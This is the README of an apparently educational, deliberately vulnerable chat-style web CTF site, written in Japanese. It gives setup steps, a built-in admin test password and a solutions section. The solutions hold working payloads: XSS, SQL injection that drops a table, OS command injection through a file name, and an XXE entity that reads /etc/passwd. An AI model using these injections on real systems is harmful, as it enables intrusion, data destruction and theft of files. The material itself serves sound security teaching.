# chat-ctf (公開サーバでの利用はしないでください)
chatアプリケーション風WebCTFサイト。
内部ネットワーク内での利用を想定した、セキュリティ教材です。

## 依存
- docker-compose
- mkcert
- sqlite3

## 起動手順

```sh
$ git clone https://github.com/TakuKitamura/chat-ctf.git
$ cd chat-ctf
$ sudo docker compose up -d
$ vim src/.env.development # 適切なものを設定。
$ # cookei-passwordについて。https://nextjs.org/docs/basic-features/environment-variables#loading-environment-variables
$ # IPは、サーバのIPアドレス
SECRET_COOKIE_PASSWORD=cookie-password
IP=192.168.1.x
$ vim src/.env.production # 適切なものを設定
SECRET_COOKIE_PASSWORD=cookie-password
IP=192.168.1.x
$ cd src
$ ./setup-db.sh # Admin/Adm1nAdm1n というテストアカウントも追加されます。
$ mkcert 192.168.1.x
$ cd ..
$ sudo docker compose exec app yarn install
$ sudo docker compose exec app yarn build && sudo docker compose exec app yarn start
$ # or
$ sudo docker compose exec app yarn dev
```
https://192.168.1.x/login でログインできます。

https://192.168.1.x/signup でアカウントを作成できます。

CSVファイルからのアカウント一括作成も可能です。

```sh
$ vim /tmp/user.csv # 一例
UserID,Password,IconURL
Test1,Maixuo7p,https://example.com/1.jpg
Test2,eoch2ieP,https://example.com/2.jpg
$ cd chat-ctf/src
$ ./add-users.sh -f /tmp/user.csv -i 192.168.1.x
```

### Adminアカウント専用機能
- Adminアカウント(`Admin/Adm1nAdm1n`)でログインし、適当なテキストボックスで`/reset-chat`と入力するとchatデータがDBから削除される。画面更新をすると、chat履歴が消えていることを確認できる。

---

<details>

<summary>問題の回答</summary>

### Echo Bot [XSS]

ブラウザのDeveloper ToolでUser Agentを下記のように変更。
```
"><img src=x onerror="alert()"><!--
```

そして、適当なメッセージを入力し送信する。

### アーティスト検索 Bot [SQL Injection]

下記のメッセージを入力し送信する。
```
search=santana
n='; DROP TABLE user; --
```

### グレースケール変換 Bot [OS Command Injection]

アップロードする画像のファイル名を例えば以下に変え、アップロードする。
```
example`sleep 3`.jpg
```

### FizzBuzz Bot [XSS]

https://192.168.1.x?q=%3Cimg%20src=%22x%22%20onerror=%22alert()%22%3E

というようなURLにアクセスした上で、下記メッセージを入力し送信する。
```
n=200
```

### Excel解析 Bot [XXE]

適当なGoogleスプレッドシートを作成し、Microsoft Excel形式でダウンロード。ファイル名をexample.xlsxとする。
以下のように細工したファイルを作成する。

```sh
$ mkdir tmp
$ mv example.xlsx tmp
$ cd tmp
$ unzip example.xlsx
$ ls
[Content_Types].xml  _rels  example.xlsx  xl
$ cat xl/sharedStrings.xml # 出力結果は例
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="4"><si><t>AAA</t></si><si><t>BBB</t></si><si><t>CCC</t></si><si><t>DDD</t></si></sst>
$ vim xl/sharedStrings.xml # 例
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="4"><si><t>&xxe;</t></si><si><t>BBB</t></si><si><t>CCC</t></si><si><t>DDD</t></si></sst>
$ zip -r crafted.xlsx '[Content_Types].xml' _rels xl
  adding: [Content_Types].xml (deflated 71%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 40%)
  adding: xl/ (stored 0%)
  adding: xl/workbook.xml (deflated 58%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/sheet1.xml (deflated 64%)
  adding: xl/worksheets/_rels/ (stored 0%)
  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 40%)
  adding: xl/drawings/ (stored 0%)
  adding: xl/drawings/drawing1.xml (deflated 66%)
  adding: xl/styles.xml (deflated 61%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 78%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 66%)
  adding: xl/sharedStrings.xml (deflated 26%)
```

そして、crafted.xlsxをアップロードする。

</details>
